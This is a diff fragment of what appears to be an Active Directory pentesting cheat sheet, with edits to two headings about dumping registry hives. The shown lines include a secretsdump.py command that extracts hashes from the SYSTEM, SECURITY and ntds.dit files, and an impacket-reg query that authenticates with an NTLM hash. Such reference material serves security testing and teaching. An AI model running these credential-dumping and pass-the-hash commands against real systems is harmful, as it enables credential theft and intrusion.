@@ -113,14 +113,14 @@ powerview is a script from powersploit that allow enumeration of the AD architec
 
 **HKEY_LOCAL_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.
 
-dump SYSTEM and SECURITY from HKLM :
+dump SYSTEM and SECURITY directly from HKLM :
 
 ```bash
 secretsdump.py local -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile hashes
 ```
 
 
-dump HKU registry with hashes argument :
+dump HKU registry remotely with hashes argument :
 ```bash
 impacket-reg -hashes :34ed87d42adaa3ca4f5db34a876cb3ab domain.local/john.doe@job query -keyName HKU\\Software
 
